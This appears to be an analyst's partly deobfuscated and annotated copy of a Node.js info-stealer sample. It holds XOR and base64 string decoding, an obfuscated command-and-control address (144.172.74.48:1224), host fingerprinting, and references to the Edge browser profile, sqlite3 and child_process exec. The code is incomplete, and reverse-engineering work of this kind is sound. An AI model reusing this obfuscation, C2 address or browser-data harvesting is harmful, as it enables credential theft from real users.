// t
const base64 = 'base64',
  // c
  utf8 = 'utf8',
  // r
  decodeHeader = (input) => {
    let s1 = input.slice(1);
    return Buffer.from(s1, base64).toString(utf8);
  },
  // e
  xorDecrypt = (input, key) => {
    let encryptedBuffer = Buffer.from(input, base64);
    const length = encryptedBuffer.length;
    let decryptedArray = new Uint8Array(length);
    for (let ii = 0; ii < length; ii++) {
      const keyIndex = 3 & ii;
      let keyValue = key.charCodeAt(keyIndex);
      decryptedArray[ii] = 255 & (encryptedBuffer[ii] ^ keyValue);
    }
    return Buffer.from(decryptedArray).toString(utf8);
  },
  // E
  decryptWithUtf8 = (input) => xorDecrypt(input, utf8),
  // o - Not sure if its xorKey
  xorKey = 'charCodeAt',
  // s
  sqlite3_string = 'sqlite3',
  // F
  child_process = 'child_process',
  // a
  crypto_string = 'crypto',
  // B
  exec = 'exec',
  // i
  request = 'request',
  // A
  path_string = 'path',
  // $
  platform_string = 'platform',
  // n
  tmpdir_string = 'tmpdir',
  // l
  home_dir_string = 'homedir',
  // R
  hostname_string = 'hostname',
  // W
  type_string = 'type',
  // V
  os = require('os'),
  // U - path
  path = require(path_string),
  // Q - sqlite3
  sqlite3 = require(sqlite3_string),
  // g - crypto
  crypto = require(crypto_string),
  // h - request
  request_module = require(request),
  // w - childprocesses[exec]
  child_process_exec = require(child_process)[exec],
  // x - os[hostname]
  hostname = os[hostname_string](),
  // f - os[platform]
  platform = os[platform_string](),
  // y - os[homedir]
  homedir = os[home_dir_string](),
  // I - os[tmpdir]
  tempdir = os[tmpdir_string](),
  // G - os[type]
  type = os[type_string](),
  // S
  fs = require('fs');

// u
let uninitializedVar;
// d
const decryptWithUtf8_v2 = (input) => xorDecrypt(input, utf8),
  // X - IP: http://144.172.74.48:1224
  constructURL = (() => {
    let originalString = 'MTQ0LjE3MiaHR0cDovLw43NC40ODoxMjI0      ';
    let part1 = 'b',
      part2 = 'a',
      part3 = '',
      part4 = '';
    for (let i = 0; i < 10; i++) {
      part1 += originalString[i];
      part2 += originalString[10 + i];
      part3 += originalString[20 + i];
      part4 += originalString[30 + i];
    }
    let shuffledString = part1 + part3 + part4;
    return decodeHeader(part2) + decodeHeader(shuffledString);
  })(),
  // C
  decodedPath = '/.npl',
  // H
  replacePath = (input) =>
    input.replace(/^~([a-z]+|\/)/, (match, group) =>
      '/' === group ? homedir : `${path[decodedPath](homedir)}/${group}`
    ),
  // Y
  mysteryVar1 = 'S2t5OA8',
  // D
  mysteryVar2 = 'AgYPTBAyD1QQJx9WFg',
  // k
  mysteryVar3 = 'EhES',
  // b
  mysteryVar4 = 'WhcKURAaEg',
  // M
  npl_string = '/.npl',
  // N
  client_string = '/client',
  // p
  writeFileSync_string = 'writeFileSync',
  // Z
  get_string = 'get',
  // m
  existsSync_string = 'existsSync',
  // J
  store_node_string = 'WgcSVwcRSFYaEAM',
  // T
  accessSync_string = 'accessSync';

// j
function checkFileExists(filePath) {
  try {
    fs[accessSync_string](filePath);
    return true;
  } catch (error) {
    return false;
  }
}

// v
const Default_string = 'Default',
  // O
  Profile_string = 'Profile',
  // K
  Edge_UserData_string = '/AppData/Local/Microsoft/Edge/User Data',
  // P
  main_mystery = (input1, input2) => {
    let result = '';
    try {
      const r = `${input1}`,
        e = require(`${homedir}${decryptWithUtf8_v2(store_node_string)}`);
      if (type != 'Windows_NT') return;
      const E = '';
    } catch (t) {}
  };

console.log(decryptWithUtf8_v2('JjEqfTYgRhJVMjR3OFQKVxIdCEs'));
